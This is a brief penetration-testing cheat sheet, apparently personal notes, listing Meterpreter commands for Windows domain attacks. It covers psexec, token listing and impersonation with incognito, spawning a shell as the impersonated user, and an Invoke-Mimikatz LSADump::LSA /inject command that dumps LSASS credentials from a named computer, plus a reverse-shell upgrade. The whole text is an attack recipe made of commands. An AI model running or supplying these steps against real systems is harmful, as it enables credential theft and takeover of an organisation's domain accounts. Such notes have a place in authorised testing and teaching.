Meterpreter:
	Ø psexec
	Ø load incognito
	Ø list_tokens -u
	Ø impresonate_token <domain>\\<user>
	Ø shell
		○ you are now <domain>\\<user>
	Ø Invoke-Mimikatz -command '"priviliges::debug" "LSADump::LSA /inject" exit' -Computer <computer FQDN>
		○ LSASS dump
	Ø rev2shell
upgrade meterpretere under escalated priviliges